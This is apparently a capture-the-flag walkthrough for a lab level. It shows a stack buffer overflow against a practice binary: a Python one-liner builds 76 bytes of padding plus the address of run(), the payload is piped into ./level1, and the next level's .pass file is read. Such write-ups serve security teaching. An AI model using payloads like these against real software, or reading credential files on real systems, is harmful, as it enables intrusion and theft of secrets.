# Level 1 — Walkthrough

## Summary

This level demonstrates a classic stack-based buffer overflow used to overwrite the return address and redirect execution to the `run()` function.

## Objective

Generate a payload that overwrites the return address with the address of `run()`, execute the vulnerable binary, and read the next-level password in `/home/user/level2/.pass`.

## Payload generation

Create the payload using Python (single-line):

```bash
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
```

- `"A"*76`: padding to fill the buffer and reach the saved return address (76 bytes).
- `"\x44\x84\x04\x08"`: little-endian representation of `0x08048444`, the address of `run()`.

Full payload structure:

```
[ 'A' * 76 ] + [ address_of_run (0x08048444, little-endian) ]
```

The command writes the payload into `/tmp/exploit` for reuse.

## Exploitation

Send the payload to the program's stdin and run the vulnerable binary:

```bash
cat /tmp/exploit - | ./level1
```

If successful, the overwritten return address will cause execution to jump to `run()`.

## After successful exploit

List and read the next-level password:

```bash
cat /home/user/level2/.pass
```

## Notes

- Ensure the address `0x08048444` is correct for your binary build — addresses can differ between builds or systems.
- Use tools like `objdump -d ./level1 | grep run` or `readelf -s ./level1 | grep run` to confirm the function address.
- When crafting payloads, prefer `python -c '...'` or `printf` to avoid shell-quoting issues.
